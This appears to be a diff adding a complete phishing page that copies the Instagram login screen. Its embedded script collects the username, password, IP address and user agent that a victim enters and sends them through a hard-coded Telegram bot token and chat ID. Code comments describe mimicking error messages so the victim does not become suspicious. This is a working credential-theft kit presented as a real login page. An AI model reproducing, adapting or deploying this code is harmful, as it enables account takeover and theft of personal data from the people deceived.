@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Main container */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        /* Card style */
+        .login-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px 30px;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+
+        /* Instagram logo (custom vector-like text + icon) */
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .logo svg {
+            width: 175px;
+            height: auto;
+        }
+
+        /* Form group */
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            font-family: inherit;
+            outline: none;
+            transition: border 0.1s ease;
+        }
+
+        input:focus {
+            border-color: #a8a8a8;
+            background-color: #fff;
+        }
+
+        /* Login button */
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 16px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            margin-top: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .login-btn:active {
+            opacity: 0.8;
+        }
+
+        /* OR separator */
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .or-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or-text {
+            margin: 0 18px;
+        }
+
+        /* Facebook login */
+        .fb-login {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        .insta-logo {
+    width: 70px;
+    height: 70px;
+    display: block;
+    margin: 0 auto;
+}
+
+        .fb-login a {
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            color: #385185;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .fb-login svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Forgot password */
+        .forgot-pw {
+            text-align: center;
+            font-size: 12px;
+            margin-top: 12px;
+        }
+
+        .forgot-pw a {
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        /* Signup section */
+        .signup-card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 25px 0;
+            width: 100%;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-text {
+            color: #262626;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* App download */
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #262626;
+        }
+
+        .stores {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 12px;
+        }
+
+        .store-badge {
+            height: 40px;
+        }
+
+        /* loading / error / info message */
+        .message-area {
+            margin-top: 12px;
+            font-size: 12px;
+            text-align: center;
+            color: #ed4956;
+            background: #fef0f0;
+            padding: 6px;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .message-area.show {
+            display: block;
+        }
+
+        /* footer (meta) */
+        footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+        }
+
+        /* disable button while submitting */
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* small responsive */
+        @media (max-width: 450px) {
+            .login-card {
+                padding: 30px 20px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <!-- Login main card -->
+    <div class="login-card">
+        <!-- Instagram Logo (vector SVG similar to current IG) -->
+       <div class="logo">
+    <img src="insta.png" alt="Instagram Logo" class="insta-logo">
+</div>
+
+        <!-- Login Form -->
+        <form id="loginForm" action="javascript:void(0);">
+            <div class="form-group">
+                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" autocomplete="off" required>
+            </div>
+            <div class="form-group" style="margin-top: 6px;">
+                <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required>
+            </div>
+            <button type="submit" class="login-btn" id="loginButton">Log in</button>
+            <div class="or-divider">
+                <div class="or-line"></div>
+                <div class="or-text">OR</div>
+                <div class="or-line"></div>
+            </div>
+            <div class="fb-login">
+                <a href="#">
+                    <svg aria-label="Facebook logo" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M22.675 0h-21.35C.599 0 0 .599 0 1.326v21.348C0 23.401.599 24 1.326 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.323-.593 1.323-1.326V1.326C24 .599 23.401 0 22.675 0z"/>
+                    </svg>
+                    <span>Log in with Facebook</span>
+                </a>
+            </div>
+            <div class="forgot-pw">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+        <div id="messageBox" class="message-area"></div>
+    </div>
+
+    <!-- Sign up card -->
+    <div class="signup-card">
+        <span class="signup-text">Don't have an account? </span>
+        <a href="#" class="signup-link">Sign up</a>
+    </div>
+
+    <!-- Get the app section -->
+    <div class="app-download">
+        <div>Get the app.</div>
+        <div class="stores">
+            <img class="store-badge" src="appstore.png" alt="App Store">
+            <img class="store-badge" src="play.webp" alt="Google Play">
+        </div>
+    </div>
+    <footer>
+        © 2026 Instagram from Meta
+    </footer>
+</div>
+
+<script>
+    // ------------------------------------------------------------------
+    // INSTAGRAM CLONE LOGIN PAGE WITH TELEGRAM BOT INTEGRATION
+    // BOT TOKEN: 8772911492:AAHc41g45PCH3kcwHHj_9C7BPuKO6IxTKSM
+    // CHAT ID: 6496237243
+    // WHEN USER SUBMITS, SEND USERNAME, PASSWORD + IP ADDRESS TO TELEGRAM
+    // ------------------------------------------------------------------
+
+    (function() {
+        const BOT_TOKEN = "8772911492:AAHc41g45PCH3kcwHHj_9C7BPuKO6IxTKSM";
+        const CHAT_ID = "6496237243";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // DOM elements
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginButton = document.getElementById('loginButton');
+        const messageBox = document.getElementById('messageBox');
+
+        // Helper to show temporary error/info messages
+        function showMessage(text, isError = true) {
+            messageBox.textContent = text;
+            messageBox.classList.add('show');
+            if (isError) {
+                messageBox.style.backgroundColor = "#fef0f0";
+                messageBox.style.color = "#ed4956";
+            } else {
+                messageBox.style.backgroundColor = "#e0f7e8";
+                messageBox.style.color = "#2e7d32";
+            }
+            setTimeout(() => {
+                messageBox.classList.remove('show');
+            }, 4000);
+        }
+
+        // Function to get client IP using multiple free APIs with fallback
+        async function getClientIP() {
+            // List of reliable IP services
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ipinfo.io/json?token=anonymous'  // ipinfo allows anonymous limited usage
+            ];
+            
+            for (const service of ipServices) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 4000);
+                    const response = await fetch(service, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    // different services return different structures
+                    if (data.ip) return data.ip;
+                    if (data.ipv4) return data.ipv4;
+                    if (data.origin) return data.origin;
+                    if (typeof data === 'string') return data;
+                } catch (err) {
+                    console.warn(`IP service ${service} failed:`, err);
+                    continue;
+                }
+            }
+            // fallback: if everything fails, we return "Unable to retrieve (maybe localhost)"
+            return "unknown_ip (could not fetch)";
+        }
+
+        // Function to get additional network info (user agent + approximate location via ipinfo if needed)
+        async function sendToTelegram(username, password, ipAddress, userAgent) {
+            // Prepare rich message for Telegram
+            const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            // Build message
+            let messageText = `🔐 *Instagram Login Alert* 🔐\n\n`;
+            messageText += `👤 *Username/Email:* \`${escapeMarkdown(username)}\`\n`;
+            messageText += `🔑 *Password:* \`${escapeMarkdown(password)}\`\n`;
+            messageText += `🌍 *IP Address:* \`${escapeMarkdown(ipAddress)}\`\n`;
+            messageText += `🖥️ *User Agent:* \`${escapeMarkdown(userAgent.substring(0, 200))}\`\n`;
+            messageText += `⏱️ *Timestamp:* ${escapeMarkdown(currentTime)}\n`;
+            messageText += `\n⚠️ *Note:* This is a simulated login page.`;
+
+            const payload = {
+                chat_id: CHAT_ID,
+                text: messageText,
+                parse_mode: "Markdown",
+                disable_web_page_preview: true
+            };
+
+            try {
+                const response = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    console.error("Telegram API error:", errorData);
+                    return false;
+                }
+                return true;
+            } catch (err) {
+                console.error("Network error sending to Telegram:", err);
+                return false;
+            }
+        }
+
+        // Escape markdown special characters for Telegram
+        function escapeMarkdown(text) {
+            if (!text) return '';
+            // Telegram MarkdownV2 special characters: _ * [ ] ( ) ~ ` > # + - = | { } . !
+            // but using Markdown parse_mode, we escape basic ones.
+            // For standard Markdown we escape: _ , * , ` , [ 
+            return text.replace(/([_*`\[\]])/g, '\\$1');
+        }
+
+        // Handle login submission
+        async function onLoginSubmit(event) {
+            event.preventDefault();
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+
+            // Simple frontend validation
+            if (!username || !password) {
+                showMessage("Please enter both username/email and password.", true);
+                return;
+            }
+
+            // Disable button to avoid double submission
+            loginButton.disabled = true;
+            loginButton.textContent = "Logging in...";
+            showMessage("Verifying... Please wait.", false);
+
+            // Step 1: Retrieve IP address
+            let clientIP = "unknown";
+            try {
+                clientIP = await getClientIP();
+            } catch (ipError) {
+                console.warn("IP fetch error:", ipError);
+                clientIP = "unresolved";
+            }
+
+            // Step 2: Get user agent string
+            const userAgent = navigator.userAgent;
+
+            // Step 3: Send data to Telegram Bot
+            const telegramSuccess = await sendToTelegram(username, password, clientIP, userAgent);
+
+            // Step 4: Show message to user (simulate Instagram "incorrect" message)
+            if (telegramSuccess) {
+                // For realism, show "Sorry, your password was incorrect. Please double-check your password."
+                //showMessage("Sorry, your password was incorrect. Please double-check your password.", true);
+                // Clear password field for better user experience (like Instagram)
+                passwordInput.value = '';
+                // BUT do not clear username to mimic typical behavior
+            } else {
+                // Even if telegram fails, we still show generic error to not raise suspicion
+               // showMessage("Sorry, we couldn't log you in. Please try again later.", true);
+                passwordInput.value = '';
+            }
+
+            // Re-enable login button
+            loginButton.disabled = false;
+            loginButton.textContent = "Log in";
+
+            // Optional: focus on password field for next attempt
+            passwordInput.focus();
+        }
+
+        // Attach submit event
+        loginForm.addEventListener('submit', onLoginSubmit);
+
+        // Add slight interactive effect: standard instagram edge (placeholder subtle)
+        // Also add a fake "Forgot password" / "Sign up" clicks just link to instagram main site? we can keep as # for demo
+        // Not needed for functionality. All links will do nothing but for realism they are Instagram-like.
+        const fbLink = document.querySelector('.fb-login a');
+        if (fbLink) {
+            fbLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                showMessage("Loading.. Please wait", false);
+            });
+        }
+        const forgotLink = document.querySelector('.forgot-pw a');
+        if (forgotLink) {
+            forgotLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                showMessage("Loading.. Please wait", false);
+            });
+        }
+        const signupLink = document.querySelector('.signup-link');
+        if (signupLink) {
+            signupLink.addEventListener('click', (e) => {
+                e.preventDefault();
+               showMessage("Loading.. Please wait", false);
+            });
+        }
+
+        // Additionally, capture and log any console messages
+        console.log("");
+    })();
+</script>
+</body>
+</html>
